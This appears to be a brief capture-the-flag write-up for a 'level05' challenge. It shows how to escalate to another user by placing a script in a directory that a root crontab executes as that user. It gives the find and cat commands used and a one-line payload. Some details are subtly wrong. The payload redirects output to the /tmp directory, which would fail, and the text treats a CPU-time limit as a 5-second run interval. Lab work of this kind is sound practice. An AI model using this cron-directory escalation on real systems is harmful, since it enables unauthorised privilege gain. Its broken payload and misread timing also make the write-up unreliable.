when you log in into level05 you get this print:
You have new mail.

after tried the next command with flag05 we've tried:
find / -type f -name "*level05*" 2>/dev/null => find all file containing level05 inside it.

/etc/apache2/sites-available/level05.conf
/var/mail/level05
/rofs/etc/apache2/sites-available/level05.conf
/rofs/var/mail/level05

we have to place with mail.

inside /var/mail/level05 we've get the following string:
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

its a crontab, The -c option is used to specify the command to be executed.
The - represents the user's login environment, and flag05 is the username.

we need to see the content of the openareaserver: cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

this executable run all exec in /opt/openarenaserver/*, it execute in subshell $i every 5 second and then delete the
exec

we need to create our own executable and put it in the right directory:
echo '/bin/getflag > /tmp' > /opt/openarenaserver/exec
then we need to wait for the crontab to be executed.

